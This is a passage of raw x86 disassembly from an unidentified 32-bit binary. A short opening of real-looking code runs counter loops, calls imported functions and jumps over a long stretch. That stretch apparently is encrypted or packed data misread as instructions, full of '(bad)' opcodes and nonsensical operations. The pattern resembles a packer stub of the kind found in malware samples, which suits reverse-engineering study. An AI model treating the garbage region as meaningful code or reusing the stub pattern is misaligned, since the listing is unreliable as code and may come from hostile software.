  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x4336a7,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x4336a7
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x4336a7,ecx
  40e279:	cmp    DWORD PTR ds:0x4336a7,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x4336db,0x4335c7
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x43366b,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x43366b
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x43366b,edx
  40e2c3:	cmp    DWORD PTR ds:0x43366b,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x4338f4
  40e2d5:	push   0x4338f4
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x43366b,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	lahf   
  40e321:	pop    ebp
  40e322:	lock (bad) 
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e31c
  40e32d:	in     al,0xdc
  40e32f:	dec    DWORD PTR [ebp+0x30]
  40e332:	imul   ebp,DWORD PTR [ebp+0x277b582c],0x44abaa2a
  40e33c:	xchg   ebx,eax
  40e33d:	lods   al,BYTE PTR ds:[esi]
  40e33e:	mov    esp,0xc11008d2
  40e343:	ja     0x40e31e
  40e345:	add    dl,ch
  40e347:	mov    edx,0x58cd985f
  40e34c:	iret   
  40e34d:	je     0x40e302
  40e34f:	rcr    ebx,cl
  40e351:	in     eax,dx
  40e352:	fdivr  DWORD PTR [ecx+0x22]
  40e355:	cmp    ebp,ebx
  40e357:	jp     0x40e3b9
  40e359:	loop   0x40e382
  40e35b:	pop    ss
  40e35c:	sbb    BYTE PTR [ebx],al
  40e35e:	iret   
  40e35f:	rcr    DWORD PTR [esi-0x7f],1
  40e362:	dec    edx
  40e363:	rcl    bh,cl
  40e365:	and    bl,dl
  40e367:	adc    eax,0xaef855b3
  40e36c:	push   eax
  40e36d:	fsubr  st(7),st
  40e36f:	or     eax,0xaabc515d
  40e374:	xor    BYTE PTR [ebp-0x13],cl
  40e377:	inc    edi
  40e378:	hlt    
  40e379:	jl     0x40e3d6
  40e37b:	lds    esi,FWORD PTR [esi]
  40e37d:	loope  0x40e318
  40e37f:	dec    esi
  40e380:	mov    edx,0xc3991a7
  40e385:	jmp    0x3bf5:0xbd101022
  40e38c:	addr16 (bad) 
  40e38e:	ss aad 0x14
  40e391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e392:	in     eax,0x4f
  40e394:	dec    edx
  40e395:	cwde   
  40e396:	jmp    0xd43202cc
  40e39b:	mov    al,0xa7
  40e39d:	dec    edx
  40e39e:	scas   al,BYTE PTR es:[edi]
  40e39f:	repnz sti 
  40e3a1:	lahf   
  40e3a2:	test   al,0x60
  40e3a4:	adc    al,0x6f
  40e3a6:	add    dh,bl
  40e3a8:	jne    0x40e41a
  40e3aa:	jmp    0x40e349
  40e3ac:	push   ds
  40e3ad:	imul   esp,DWORD PTR [edi],0xffffffb4
  40e3b0:	pop    ds
  40e3b1:	or     DWORD PTR [eax+edi*4+0x25969366],esi
  40e3b8:	pop    ss
  40e3b9:	jns    0x40e375
  40e3bb:	jl     0x40e3cb
  40e3bd:	cli    
  40e3be:	sbb    al,0xdc
  40e3c0:	sub    eax,0x73249b8f
  40e3c5:	out    dx,eax
  40e3c6:	int    0xe
  40e3c8:	sub    BYTE PTR [edi+edx*2-0x65],al
  40e3cc:	push   ebp
  40e3cd:	pop    ss
  40e3ce:	inc    ebx
  40e3cf:	push   ebp
  40e3d0:	sub    al,0x6e
  40e3d2:	adc    eax,0xcfc516bd
  40e3d7:	sub    eax,0x5295cd74
  40e3dc:	mov    ds:0xe8fb1a6c,eax
  40e3e1:	fstp   st(1)
  40e3e3:	mov    al,0x2b
  40e3e5:	sbb    ebp,ebx
  40e3e7:	mov    dl,0x7f
  40e3e9:	or     al,0x6a
  40e3eb:	adc    cl,BYTE PTR [edi+0x46c5a1ab]
  40e3f1:	or     al,0xc4
  40e3f4:	xchg   ebp,eax
  40e3f5:	clc    
  40e3f6:	push   ecx
  40e3f7:	imul   eax,esp,0x23
  40e3fa:	repnz cmp dh,dh
  40e3fd:	stos   BYTE PTR es:[edi],al
  40e3fe:	mov    dh,0x4f
  40e400:	mov    al,ds:0x8852f5df
  40e405:	(bad)  
  40e406:	cmp    DWORD PTR ds:0xf48077b8,edi
  40e40c:	push   es
  40e40d:	imul   bh
  40e40f:	loop   0x40e3c6
  40e411:	mov    ebp,0xb4f5cdf6
  40e416:	mov    ds:0xa2b2d0b9,al
  40e41b:	loopne 0x40e44b
  40e41d:	div    ecx
  40e41f:	iret   
  40e420:	jne    0x40e47c
  40e422:	stc    
  40e423:	test   DWORD PTR [edi-0x53],ecx
  40e426:	xchg   edi,eax
  40e427:	mov    eax,ds:0x69dd8c5e
  40e42c:	ins    BYTE PTR es:[edi],dx
  40e42d:	mov    ch,0xdd
  40e42f:	mov    WORD PTR [edx],ss
  40e431:	addr16 je 0x40e44f
  40e434:	scas   al,BYTE PTR es:[edi]
  40e435:	push   cs
  40e436:	pop    eax
  40e437:	cdq    
  40e438:	pop    edx
  40e439:	jne    0x40e3ff
  40e43b:	dec    ecx
  40e43c:	xor    eax,0x379a008d
  40e441:	or     al,0x1
  40e443:	test   DWORD PTR [ecx-0x73],esp
  40e446:	adc    dh,BYTE PTR [ecx-0x6e]
  40e449:	sub    ecx,esi
  40e44b:	ret    
  40e44c:	pop    edx
  40e44d:	loopne 0x40e469
  40e44f:	hlt    
  40e450:	xor    bh,BYTE PTR [edx+0xa]
  40e453:	cmp    DWORD PTR [ebx+ecx*1+0x22f3a856],ebp
  40e45a:	pushf  
  40e45b:	inc    ebx
  40e45c:	mov    DWORD PTR [ebx],edx
  40e45e:	loopne 0x40e4d3
  40e460:	int    0x75
  40e462:	push   esp
  40e463:	fisub  WORD PTR [edi-0x22228c90]
  40e469:	ret    0x729c
  40e46c:	push   esi
  40e46d:	cmp    edx,eax
  40e46f:	adc    al,bh
  40e471:	mov    ebx,edi
  40e473:	jo     0x40e457
  40e475:	jge    0x40e49c
  40e477:	lds    esp,FWORD PTR [edi-0x60aa70fa]
  40e47d:	call   0x7054:0x1001ad52
  40e484:	cdq    
  40e485:	push   eax
  40e486:	icebp  
  40e487:	dec    DWORD PTR [edx+eax*8-0x15]
  40e48b:	mov    bl,0xdb
  40e48d:	dec    eax
  40e48e:	shl    DWORD PTR [ecx+0x2],1
  40e491:	jbe    0x40e4a0
  40e493:	fcomp  st(3)
  40e495:	scas   al,BYTE PTR es:[edi]
  40e496:	test   BYTE PTR [eax+0x31],dl
  40e499:	sbb    DWORD PTR [eax-0x21],ebx
  40e49c:	and    BYTE PTR [esi-0x15],cl
  40e49f:	mov    ds:0x46420606,al
  40e4a4:	cwde   
  40e4a5:	test   BYTE PTR [esi],dl
  40e4a7:	push   esi
  40e4a8:	out    0xcb,eax
  40e4aa:	adc    al,0xcf
  40e4ac:	pop    ss
  40e4ad:	jmp    0xde489b02
  40e4b2:	pop    ebp
  40e4b3:	sbb    ch,BYTE PTR [edi+0x462b7d7b]
  40e4b9:	mov    ebp,0xe1dad199
  40e4be:	ret    0xf217
  40e4c1:	(bad)  
  40e4c2:	or     al,0x3b
  40e4c4:	stc    
  40e4c5:	mov    ebp,0xa7a75827
  40e4ca:	mov    ah,0x84
  40e4cc:	and    al,0xa
  40e4ce:	mov    ds:0x6f5a199d,al
  40e4d3:	dec    esi
  40e4d4:	jb     0x40e4c8
  40e4d6:	mov    al,0x85
  40e4d8:	cld    
  40e4d9:	bound  eax,QWORD PTR [ecx]
  40e4db:	arpl   WORD PTR [edx],di
  40e4dd:	cli    
  40e4de:	jecxz  0x40e4de
  40e4e0:	xchg   edx,eax
  40e4e1:	das    
  40e4e2:	cli    
  40e4e3:	or     eax,0x6188c950
  40e4e8:	test   eax,0x86f4e786
  40e4ed:	jge    0x40e48e
  40e4ef:	out    0xbc,al
  40e4f1:	inc    ebx
  40e4f2:	mov    eax,ds:0x871515f7
  40e4f7:	in     al,0x83
  40e4f9:	scas   eax,DWORD PTR es:[edi]
  40e4fa:	xchg   esp,eax
  40e4fb:	std    
  40e4fc:	fucom  st(7)
  40e4fe:	pop    ebx
  40e4ff:	push   esi
  40e500:	(bad)  
  40e501:	cli    
  40e502:	mov    DWORD PTR [ebx],ebx
  40e504:	gs jbe 0x40e579
  40e507:	pop    esp
  40e508:	(bad)  
  40e509:	imul   esi,DWORD PTR [eax+eax*8],0xab1bc5f9
  40e510:	pop    ss
  40e511:	cli    
  40e512:	sub    bl,BYTE PTR [ecx+0x6950e21]
  40e518:	test   eax,0x2f3d78cb
  40e51d:	lock repz clc 
  40e520:	sbb    eax,0xaf9a2660
  40e525:	lods   eax,DWORD PTR ds:[esi]
  40e526:	jmp    0x7e774b8a
  40e52b:	pop    edi
  40e52c:	mov    ecx,0x6c8822af
  40e531:	push   esp
  40e532:	ret    0xc828
  40e535:	jmp    0xd88a24aa
  40e53a:	int    0x56
  40e53c:	xor    ch,BYTE PTR [edi]
  40e53e:	inc    ebp
  40e53f:	mov    edi,eax
  40e541:	adc    ecx,DWORD PTR [ebx+0x71d0f397]
  40e547:	sbb    DWORD PTR [ebp+0x4a1be0ef],0xcdb32d2f
  40e551:	arpl   WORD PTR [ecx+0x2],si
  40e554:	(bad)  
  40e555:	mov    ecx,DWORD PTR [ebp+edx*8+0x3c]
  40e559:	mov    WORD PTR [ecx],ss
  40e55b:	int    0x6b
  40e55d:	mov    eax,0x76f6b257
  40e562:	pop    esp
  40e563:	sub    BYTE PTR [eax],dl
  40e565:	mov    bl,0x4b
  40e567:	leave  
  40e568:	paddb  mm0,QWORD PTR [ebp+0x2581534d]
  40e56f:	fadd   QWORD PTR [eax]
  40e571:	sbb    DWORD PTR [eax-0x10],eax
  40e574:	xchg   esp,eax
  40e575:	add    BYTE PTR [ebx+edi*1+0x7c6ba852],0x81
  40e57d:	sbb    BYTE PTR [edi-0x13233028],bh
  40e583:	(bad)  
  40e584:	mov    ebp,0xebb0a1f
  40e589:	and    DWORD PTR [eax-0x1fcc16ab],esp
  40e58f:	add    al,BYTE PTR [edi-0x53c8caeb]
  40e595:	popf   
  40e596:	jmp    0x9aea:0x1417bf81
  40e59d:	xchg   ebp,eax
  40e59e:	stc    
  40e59f:	fadd   QWORD PTR [ecx]
  40e5a1:	mov    esi,0x614d6caa
  40e5a6:	mov    al,0x9d
  40e5a8:	bound  edx,QWORD PTR [eax]
  40e5aa:	lahf   
  40e5ab:	imul   esp,esp,0x458214c8
  40e5b1:	jp     0x40e5a6
  40e5b3:	jo     0x40e5e6
  40e5b5:	push   0xffffffc1
  40e5b7:	ret    0x2dbb
  40e5ba:	iret   
  40e5bb:	xor    DWORD PTR [ebp+0x79],0x3277928c
  40e5c2:	xchg   esi,eax
  40e5c3:	push   ebp
  40e5c4:	mov    cl,0x33
  40e5c6:	xchg   ebx,eax
  40e5c7:	ss std 
  40e5c9:	xchg   ebx,eax
  40e5ca:	retf   
  40e5cb:	push   ebx
  40e5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5cd:	sub    al,0xfc
  40e5cf:	ss (bad) 
  40e5d1:	adc    edi,DWORD PTR [eax+0x6d232209]
  40e5d7:	push   0x864617c5
  40e5dc:	js     0x40e5b4
  40e5de:	call   0xe144:0x7adc5b6e
  40e5e5:	and    al,0x68
  40e5e7:	push   ebx
  40e5e8:	push   ebp
  40e5e9:	inc    ecx
  40e5ea:	std    
  40e5eb:	mov    ch,BYTE PTR [ebp+0x2b075d37]
  40e5f1:	mov    cs,ecx
  40e5f3:	mov    eax,ds:0x5bfc3d3c
  40e5f8:	jns    0x40e588
  40e5fa:	sbb    DWORD PTR [edi-0x2530854f],0x56806bed
  40e604:	mov    esi,0x5a93e01c
  40e609:	add    bh,BYTE PTR [edi+0x45e643a9]
  40e60f:	ret    
  40e610:	jns    0x40e5d1
  40e612:	ret    
  40e613:	or     BYTE PTR [ebp+0x6c255af5],ch
  40e619:	inc    esi
  40e61a:	lock adc BYTE PTR [eax+edx*4],0x45
  40e61f:	sub    eax,0x25b3eda4
  40e624:	mov    bl,0x3e
  40e626:	cmp    DWORD PTR [eax+0x5c],esp
  40e629:	push   ebx
  40e62a:	test   eax,0x88be76e1
  40e62f:	popf   
  40e630:	loopne 0x40e622
  40e632:	cmp    al,0xf8
  40e634:	scas   eax,DWORD PTR es:[edi]
  40e635:	mov    ecx,0xd72708b
  40e63a:	aad    0xb4
  40e63c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e63d:	mov    ch,0x24
  40e63f:	call   DWORD PTR [edi-0x3ef9f68d]
  40e645:	ja     0x40e658
  40e647:	mov    ch,0x71
  40e649:	rcl    DWORD PTR [edx-0x79],1
  40e64c:	out    dx,al
  40e64d:	test   DWORD PTR [edx+0x37],ecx
  40e650:	pop    esp
  40e651:	inc    ecx
  40e652:	push   cs
  40e653:	push   ebx
  40e654:	adc    dl,ah
  40e656:	div    BYTE PTR [edx+0x25c93d81]
  40e65c:	loopne 0x40e676
  40e65e:	and    bh,cl
  40e660:	outs   dx,BYTE PTR ds:[esi]
  40e661:	int    0xbb
  40e663:	push   ss
  40e664:	adc    eax,0xbe94a992
  40e669:	mov    bh,0xcc
  40e66b:	push   ebp
  40e66c:	data16 out dx,al
  40e66e:	lods   eax,DWORD PTR ds:[esi]
  40e66f:	fcomp  DWORD PTR [esi-0x27d008af]
  40e675:	xchg   DWORD PTR [eax+edi*8-0x37939ba7],ecx
  40e67c:	dec    edx
  40e67d:	aad    0xb9
  40e67f:	test   al,0x7c
  40e681:	retf   0xa9ca
  40e684:	mov    ds:0x58b937a7,eax
  40e689:	inc    ebx
  40e68a:	inc    ebp
  40e68b:	loope  0x40e64e
  40e68d:	dec    esp
  40e68e:	fidivr DWORD PTR [edi+0x6246e7f0]
  40e694:	sbb    BYTE PTR [edi+0x2155f079],0xce
  40e69b:	add    cl,cl
  40e69d:	lods   al,BYTE PTR ds:[esi]
  40e69e:	cmp    eax,0xf09bee7b
  40e6a3:	push   ebp
  40e6a4:	dec    DWORD PTR [eax-0x68]
  40e6a7:	int3   
  40e6a8:	sbb    BYTE PTR [eax-0x65],bh
  40e6ab:	jb     0x40e691
  40e6ad:	shl    DWORD PTR [eax-0x79fb647f],1
  40e6b3:	dec    edx
  40e6b4:	sti    
  40e6b5:	xor    cl,BYTE PTR [esi]
  40e6b7:	adc    DWORD PTR [eax+0x68],edx
  40e6ba:	mov    al,ds:0xdda2b595
  40e6bf:	scas   al,BYTE PTR es:[edi]
  40e6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c1:	cmp    DWORD PTR [edx-0x34],edx
  40e6c4:	inc    edi
  40e6c5:	outs   dx,DWORD PTR ds:[esi]
  40e6c6:	mov    dh,0xdc
  40e6c8:	fsub   st,st(6)
  40e6ca:	sahf   
  40e6cb:	jno    0x40e6e1
  40e6cd:	sbb    eax,0xfeca3035
  40e6d2:	jge    0x40e659
  40e6d4:	push   esp
  40e6d5:	mov    DWORD PTR [ecx],eax
  40e6d7:	jmp    0x40ea9d
  40e6dc:	or     ebp,DWORD PTR [edx+0x67]
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e6c5
  40e6e9:	(bad)  
  40e6eb:	xchg   ebx,eax
  40e6ec:	ins    BYTE PTR es:[edi],dx
  40e6ed:	mov    eax,ds:0x79a77c7c
  40e6f2:	jl     0x40e770
  40e6f4:	lea    edi,[edx-0x30]
  40e6f7:	or     al,0xfd
  40e6f9:	or     BYTE PTR [edx-0x15],bl
  40e6fc:	jmp    0x993a695b
  40e701:	test   DWORD PTR [edx+0x10],0x4d29d845
  40e708:	push   edx
  40e709:	rcl    DWORD PTR [edi-0x5a16bfce],cl
  40e70f:	adc    al,0xa7
  40e711:	pop    es
  40e712:	lahf   
  40e713:	xor    ecx,edx
  40e715:	jl     0x40e6c2
  40e717:	mov    bh,0x40
  40e719:	mov    DWORD PTR [edx],eax
  40e71b:	inc    edx
  40e71c:	imul   ebx,DWORD PTR [eax],0x2c
  40e71f:	loop   0x40e6e7
  40e721:	add    bl,bh
  40e723:	jmp    0xe5894d7
  40e728:	ffree  st(6)
  40e72a:	jp     0x40e7a8
  40e72c:	cdq    
  40e72d:	adc    DWORD PTR [edx+0x52f8e6d5],ebx
  40e733:	gs xchg esp,eax
  40e735:	mov    ds:0x80ceb901,eax
  40e73a:	jl     0x40e702
  40e73c:	lods   al,BYTE PTR ds:[esi]
  40e73d:	aaa    
  40e73e:	push   esi
  40e73f:	stc    
  40e740:	(bad)  
  40e741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e742:	push   esi
  40e743:	mov    cl,0x9f
  40e745:	inc    DWORD PTR [edi-0x443ee9c4]
  40e74b:	into   
  40e74c:	xor    eax,0x5843beee
  40e751:	and    eax,0x1a453779
  40e756:	loop   0x40e724
  40e758:	jmp    0x40e7b8
  40e75a:	add    BYTE PTR [ebx],bh
  40e75c:	sub    esp,0xffffffb9
  40e75f:	fdiv   DWORD PTR [eax-0x594bc09f]
  40e765:	fs iret 
  40e767:	mov    dh,0x7f
  40e769:	cmp    BYTE PTR [ebx],dl
  40e76b:	popa   
  40e76c:	lahf   
  40e76d:	and    edx,DWORD PTR [ecx]
  40e76f:	mov    ds:0x7442ce14,al
  40e774:	mov    edx,0x653a7d27
  40e779:	xchg   DWORD PTR [ebx+eiz*4+0xa],ebp
  40e77d:	mov    ch,0x4a
  40e77f:	dec    esi
  40e780:	leave  
  40e781:	inc    edx
  40e782:	pop    ds
  40e783:	jmp    0x40e76b
  40e785:	fwait
  40e786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e787:	xchg   ebx,eax
  40e788:	mov    al,0x6a
  40e78a:	(bad)  
  40e78c:	pop    ss
  40e78d:	ins    BYTE PTR es:[edi],dx
  40e78e:	cwde   
  40e78f:	aas    
  40e790:	cmp    eax,0x632d87ae
  40e795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e796:	jge    0x40e7c5
  40e798:	lahf   
  40e799:	cli    
  40e79a:	adc    dh,BYTE PTR [edx+0x15e911e]
  40e7a0:	lods   eax,DWORD PTR ds:[esi]
  40e7a1:	int    0xf3
  40e7a3:	iret   
  40e7a4:	(bad)  
  40e7a5:	ins    DWORD PTR es:[edi],dx
  40e7a6:	and    al,0x40
  40e7a8:	sti    
  40e7a9:	add    cl,BYTE PTR [esi-0x69b7b506]
  40e7af:	pop    es
  40e7b0:	not    DWORD PTR [edx+0x7485927c]
  40e7b6:	cld    
  40e7b7:	fwait
  40e7b8:	and    DWORD PTR [ecx+0x7f],0xffffffa9
  40e7bc:	xor    al,BYTE PTR [esi+0x67659132]
  40e7c2:	mov    ds:0xdf8941ba,eax
  40e7c7:	mov    cl,0x63
  40e7c9:	adc    eax,0xcd61c73f
  40e7ce:	ins    DWORD PTR es:[edi],dx
  40e7cf:	mov    esp,0x38de37a5
  40e7d4:	call   0xd9c2:0x1880cd7e
  40e7db:	(bad)  
  40e7dc:	jp     0x40e843
  40e7de:	in     eax,0xd
  40e7e0:	mov    bl,0xa2
  40e7e2:	out    dx,eax
  40e7e3:	cli    
  40e7e4:	icebp  
  40e7e5:	xchg   ecx,eax
  40e7e6:	inc    esp
  40e7e7:	lods   al,BYTE PTR ds:[esi]
  40e7e8:	popf   
  40e7e9:	jmp    0xa4a2:0x6e0c77c4
  40e7f0:	fstp   TBYTE PTR [edi+ebx*2+0x3088d12]
  40e7f7:	out    0xa9,eax
  40e7f9:	retf   
  40e7fa:	push   cs
  40e7fb:	mov    dl,0x71
  40e7fd:	jecxz  0x40e827
  40e7ff:	jge    0x40e7d5
  40e801:	mov    ebp,0xe5f4ce2c
  40e806:	loopne 0x40e82e
  40e808:	jl     0x40e82d
  40e80a:	or     ah,bl
  40e80c:	sub    eax,0xa2bff7e0
  40e811:	pushf  
  40e812:	in     al,0x49
  40e814:	pop    esi
  40e815:	mov    ds:0x298b5d7d,eax
  40e81a:	push   ds
  40e81b:	in     eax,dx
  40e81c:	pusha  
  40e81d:	push   ecx
  40e81e:	pop    eax
  40e81f:	ret    0x7e66
  40e822:	fiadd  DWORD PTR [eax+0x77dfbd64]
  40e828:	ja     0x40e810
  40e82a:	push   edx
  40e82b:	xor    ecx,DWORD PTR [ebx-0x7cc05ba1]
  40e831:	or     BYTE PTR [esi+edi*8],cl
  40e834:	mov    cl,0xf
  40e836:	ins    DWORD PTR es:[edi],dx
  40e837:	cmp    BYTE PTR [ebp+0x1702007d],ah
  40e83d:	fs cmp al,0x9c
  40e840:	adc    eax,0x9dabf809
  40e845:	das    
  40e846:	jns    0x40e832
  40e848:	rol    DWORD PTR [edx+0x1c64cda3],0x15
  40e84f:	sub    eax,0x93973b6
  40e854:	sub    esp,DWORD PTR [eax+0x730bf3ac]
  40e85a:	and    al,0x4a
  40e85c:	dec    esp
  40e85d:	mov    edx,0x74af4f7c
  40e862:	addr16 aad 0xdf
  40e865:	aas    
  40e866:	jmp    0xe0985482
  40e86b:	out    0x96,al
  40e86d:	popa   
  40e86e:	mov    bl,0xad
  40e870:	or     BYTE PTR ds:0xbaa1bd39,cl
  40e876:	stos   BYTE PTR es:[edi],al
  40e877:	cmp    eax,0xf02d6c6e
  40e87c:	aaa    
  40e87d:	icebp  
  40e87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e87f:	adc    bl,BYTE PTR [ebx-0x7f]
  40e882:	mov    ecx,0x4e0ad8e8
  40e887:	out    0xc7,eax
  40e889:	inc    eax
  40e88a:	mov    esi,0x1b5622cf
  40e88f:	adc    edx,DWORD PTR [edx+0x3a]
  40e892:	jne    0x40e837
  40e894:	es loopne 0x40e83e
  40e897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e898:	out    0x87,al
  40e89a:	xor    BYTE PTR [edi+0x6c],bh
  40e89d:	jo     0x40e863
  40e89f:	ret    0xddf8
  40e8a2:	mov    BYTE PTR ds:0x75a1e66e,ch
  40e8a8:	call   DWORD PTR [edx+0x7f]
  40e8ab:	and    al,0x6d
  40e8ad:	or     al,BYTE PTR [edx]
  40e8af:	loopne 0x40e92a
  40e8b1:	cli    
  40e8b2:	gs push 0x3539fc52
  40e8b8:	pop    eax
  40e8b9:	stos   DWORD PTR es:[edi],eax
  40e8ba:	sbb    ebp,DWORD PTR ds:0xee4b5870
  40e8c0:	adc    BYTE PTR [edx+edi*8-0x62],0x39
  40e8c5:	pop    ebp
  40e8c6:	sti    
  40e8c7:	out    dx,al
  40e8c8:	or     DWORD PTR [bp+di-0x22],esi
  40e8cc:	cmp    BYTE PTR [ecx-0x4e],0x0
  40e8d0:	xchg   DWORD PTR [ebx],edi
  40e8d2:	pop    esi
  40e8d3:	xchg   ebx,eax
  40e8d4:	sbb    al,0x55
  40e8d6:	ss loop 0x40e869
  40e8d9:	push   0xde0241cc
  40e8de:	cmp    bh,BYTE PTR [edi+ebx*8]
  40e8e1:	sub    al,0x86
  40e8e3:	pop    ebp
  40e8e4:	mov    al,ds:0x9aa1a78a
  40e8e9:	imul   esi,DWORD PTR [edi+0x3cd630e6],0x2f8358c4
  40e8f3:	data16 daa 
  40e8f5:	out    dx,al
  40e8f6:	push   eax
  40e8f7:	mov    bl,0x89
  40e8f9:	stos   BYTE PTR es:[edi],al
  40e8fa:	lods   al,BYTE PTR ds:[esi]
  40e8fb:	imul   DWORD PTR [edx-0x70]
  40e8fe:	int    0x97
  40e900:	test   DWORD PTR [ebp-0x321cd139],ebp
  40e906:	mov    ah,0x38
  40e908:	scas   eax,DWORD PTR es:[edi]
  40e909:	push   0xffffffcd
  40e90b:	inc    esp
  40e90c:	xor    esi,DWORD PTR [ebp+0x4958c6ec]
  40e912:	test   BYTE PTR [ebx],ah
  40e914:	jge    0x40e919
  40e916:	add    cl,BYTE PTR [ebx+edx*4]
  40e919:	xchg   BYTE PTR [eax],al
  40e91b:	push   es
  40e91c:	cwde   
  40e91d:	arpl   WORD PTR [ecx],si
  40e91f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e920:	pop    esp
  40e921:	pop    es
  40e922:	dec    edx
  40e923:	test   ebx,ebp
  40e925:	jns    0x40e923
  40e927:	jg     0x40e8dc
  40e929:	test   al,0x4b
  40e92b:	test   DWORD PTR [edi],0x4501d849
  40e931:	adc    ch,BYTE PTR [esi-0x2b]
  40e934:	repnz out 0x66,al
  40e937:	add    DWORD PTR [ecx],0x82459dd8
  40e93d:	jmp    0xadf3d3e6
  40e942:	es xchg esi,eax
  40e944:	mov    eax,ds:0x52b3c00c
  40e949:	ins    DWORD PTR es:[edi],dx
  40e94a:	sahf   
  40e94b:	stc    
  40e94c:	push   0x71
  40e94e:	xchg   edi,eax
  40e94f:	fidivr DWORD PTR [ecx+0x41b14e4]
  40e955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e956:	test   al,0x83
  40e958:	jecxz  0x40e9a3
  40e95a:	in     eax,dx
  40e95b:	mov    bh,0x25
  40e95d:	cdq    
  40e95e:	and    ecx,eax
  40e960:	or     dh,BYTE PTR [ebp-0x10]
  40e963:	enter  0x97c1,0x12
  40e967:	push   ds
  40e968:	lods   al,BYTE PTR ds:[esi]
  40e969:	adc    eax,0x15f0dd53
  40e96e:	cmp    ah,dl
  40e970:	jp     0x40e9bc
  40e972:	lds    ebx,FWORD PTR [eax-0x7c]
  40e975:	xchg   ecx,eax
  40e976:	mov    ebx,DWORD PTR [edi+esi*8+0x69a2671a]
  40e97d:	and    al,0xe5
  40e97f:	dec    edi
  40e980:	xlat   BYTE PTR ds:[ebx]
  40e981:	cmp    edi,ecx
  40e983:	sar    BYTE PTR [ebp+0x19a7614c],0x40
  40e98a:	add    BYTE PTR [ecx+edx*2],dh
  40e98d:	out    0x8b,al
  40e98f:	icebp  
  40e990:	imul   edx,DWORD PTR [esi],0x36
  40e993:	jbe    0x40e9ae
  40e995:	mov    DWORD PTR [eax+ecx*4],esi
  40e998:	dec    eax
  40e999:	ss jl  0x40e98a
  40e99c:	xchg   DWORD PTR [edi+0x43],ebp
  40e99f:	test   eax,0x2603e38c
  40e9a4:	inc    eax
  40e9a5:	sbb    eax,0x3ac4ce27
  40e9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ab:	ja     0x40e9ad
  40e9ad:	mov    dh,0xd0
  40e9af:	jbe    0x40e97d
  40e9b1:	xlat   BYTE PTR ds:[ebx]
  40e9b2:	nop/reserved BYTE PTR ds:0xaf364a17
  40e9b9:	jns    0x40e9f6
  40e9bb:	ja     0x40ea12
  40e9bd:	and    al,0x2f
  40e9bf:	out    0x74,al
  40e9c1:	shr    ch,1
  40e9c3:	popf   
  40e9c4:	out    0x5,eax
  40e9c6:	xchg   DWORD PTR [edi+0x41b555b8],edi
  40e9cc:	mov    cl,0x38
  40e9ce:	jne    0x40e960
  40e9d0:	mov    WORD PTR [esi],ss
  40e9d2:	push   es
  40e9d3:	in     al,dx
  40e9d4:	popa   
  40e9d5:	xchg   ebx,eax
  40e9d6:	sub    cl,bh
  40e9d8:	adc    BYTE PTR [esi],ah
  40e9da:	push   ebx
  40e9db:	push   ecx
  40e9dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9dd:	pop    esp
  40e9de:	aad    0x43
  40e9e0:	push   edi
  40e9e1:	mov    fs,ecx
  40e9e3:	scas   al,BYTE PTR es:[edi]
  40e9e4:	adc    eax,0x4aa41b0
  40e9e9:	dec    edi
  40e9ea:	(bad)  
  40e9ec:	arpl   WORD PTR [eax-0x61],dx
  40e9ef:	dec    edi
  40e9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9f1:	shl    DWORD PTR [eax+0x5f],1
  40e9f4:	sub    dh,BYTE PTR [edx-0x25]
  40e9f7:	xchg   edx,eax
  40e9f8:	jg     0x40e9cd
  40e9fa:	jmp    0xc5d1:0x92a9c388
  40ea01:	xchg   edx,eax
  40ea02:	sub    al,0x81
  40ea04:	cmc    
  40ea05:	pop    edx
  40ea06:	test   DWORD PTR [ebx],0xa3164d2b
  40ea0c:	cmp    al,bl
  40ea0e:	sub    BYTE PTR [ebp-0x71ec432c],dl
  40ea14:	sbb    edx,edx
  40ea16:	jg     0x40ea6e
  40ea18:	cmc    
